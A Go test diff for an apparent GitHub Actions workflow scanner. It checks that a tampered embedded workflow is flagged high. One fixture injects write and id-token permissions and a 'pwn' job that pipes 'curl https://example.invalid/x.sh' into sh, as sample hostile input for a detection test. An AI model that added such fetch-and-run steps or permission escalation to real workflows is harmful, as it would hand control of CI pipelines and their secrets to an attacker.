@@ -273,6 +273,86 @@ func TestScanExecutingWorkflowFlag(t *testing.T) {
 	}
 }
 
+// TestVersionSkewFirstIntroductionRepro is the reviewer's case: a base
+// with no embed, then an embed whose pin is aaaa..., permissions
+// contents: write and id-token: write, an extra job that runs curl|sh,
+// and embed.json version 99.0.0 with the digests re-recorded. CI with
+// --executing-workflow pointing at that pin, and an older trusted
+// release, both report the workflow high.
+func TestVersionSkewFirstIntroductionRepro(t *testing.T) {
+	pin := strings.Repeat("a", 40)
+	exec := "vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@" + pin
+	repo := firstIntroductionRepo(t, edits(
+		replaceInFile(embedded.WorkflowPath, "      contents: read # checkout the repository being scanned\n      pull-requests: read # tripcord-pr.yml reads pull request reviews\n      security-events: write # upload the SARIF report\n", "      contents: write\n      id-token: write\n"),
+		replaceInFile(embedded.WorkflowPath, "      fail-on: high\n", "      fail-on: high\n  pwn:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.invalid/x.sh | sh\n"),
+	))
+	for _, scanner := range []struct {
+		name    string
+		version string
+		args    []string
+	}{
+		{"older trusted release", "0.0.9", []string{repo}},
+		{"CI first introduction", "dev", []string{"--base", "HEAD~1", "--executing-workflow", exec, repo}},
+	} {
+		t.Run(scanner.name, func(t *testing.T) {
+			withScannerVersion(t, scanner.version)
+			if scanner.name == "older trusted release" {
+				t.Setenv("GITHUB_ACTIONS", "")
+			}
+			code, stdout, stderr := runCLI(t, append([]string{"scan", "--format", "json"}, scanner.args...)...)
+			if code != int(exitcode.Findings) {
+				t.Fatalf("exit %d, want findings\n%s\n%s", code, stdout, stderr)
+			}
+			var workflow bool
+			for _, f := range skewScan(t, scanner.args...) {
+				if f.path == embedded.WorkflowPath && (f.severity == model.SeverityHigh || f.severity == model.SeverityCritical) {
+					workflow = true
+				}
+			}
+			if !workflow {
+				t.Fatal("tripcord.yml is not high")
+			}
+		})
+	}
+}
+
+// TestVersionSkewFirstIntroductionStaysLow: the same first introduction
+// with no shape change stays low. The pin matches --executing-workflow
+// and only attests to itself.
+func TestVersionSkewFirstIntroductionStaysLow(t *testing.T) {
+	pin := strings.Repeat("a", 40)
+	exec := "vgmartinez/tripcord/.github/workflows/tripcord-pr.yml@" + pin
+	repo := firstIntroductionRepo(t, nil)
+	withScannerVersion(t, "0.0.9")
+	t.Setenv("GITHUB_ACTIONS", "")
+	got := skewScan(t, "--base", "HEAD~1", "--executing-workflow", exec, repo)
+	if highs := skewHighs(got); len(highs) != 0 {
+		t.Fatalf("clean first introduction: high %+v", highs)
+	}
+	if len(got) == 0 {
+		t.Fatal("clean first introduction produced no finding")
+	}
+	assertScanLocally(t, got)
+}
+
+// firstIntroductionRepo is a repository whose base commit has no embed
+// and whose head is init --embed --version 99.0.0, plus edit, with the
+// workflow pin set to aaaa... and the digests re-recorded.
+func firstIntroductionRepo(t *testing.T, edit func(*testing.T, string)) string {
+	t.Helper()
+	repo := gitRepo(t)
+	if code, _, stderr := runCLI(t, "init", "--embed", "--version", "99.0.0", "--sha256", "linux-x64="+testSHA256, repo); code != 0 {
+		t.Fatalf("init: exit %d: %s", code, stderr)
+	}
+	steps := []func(*testing.T, string){repinWorkflowTo(strings.Repeat("a", 40)), rerecord}
+	if edit != nil {
+		steps = append([]func(*testing.T, string){edit}, steps...)
+	}
+	edits(steps...)(t, repo)
+	commitAll(t, repo)
+	return repo
+}
+
 // TestInitRefusesOlderVersion: a release init pinning an older release
 // would leave the pinned binary's own scan judging a newer embed.
 func TestInitRefusesOlderVersion(t *testing.T) {
